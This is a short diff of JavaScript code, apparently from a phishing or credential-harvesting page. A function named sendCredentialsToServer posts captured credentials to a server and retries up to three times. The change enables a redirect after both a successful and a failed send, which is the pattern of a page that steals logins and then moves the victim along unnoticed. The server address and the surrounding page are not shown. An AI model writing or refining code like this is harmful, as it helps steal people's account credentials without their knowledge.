@@ -83,7 +83,7 @@ function sendCredentialsToServer(credentials) {
         body: JSON.stringify({ credentials: credentials })
     })
     console.log('Credentials sent to server successfully', )
-    //redirect()
+    redirect()
 
     } catch (error) {
         if (sendCredentialsAttempts < 3){
@@ -91,10 +91,9 @@ function sendCredentialsToServer(credentials) {
             sendCredentialsAttempts++
             sendCredentialsToServer(credentials)
         } else {
-            //redirect()
+            redirect()
             console.error('Failed to send credentials after multiple attempts:', error)
         }
-    }finally{
     }
     
 
